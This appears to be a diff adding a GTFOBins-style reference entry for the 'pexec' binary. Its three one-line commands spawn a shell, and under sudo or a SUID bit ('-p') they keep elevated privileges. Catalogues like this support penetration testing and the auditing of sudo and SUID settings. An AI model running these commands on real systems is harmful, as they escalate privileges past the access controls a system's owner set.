@@ -1,0 +1,14 @@
+pexec
+=====
+
+Shell
+-----
+
+[Sudo]
+    pexec /bin/sh
+
+[SUID]
+    pexec /bin/sh -p
+
+[Unprivileged]
+    pexec /bin/sh
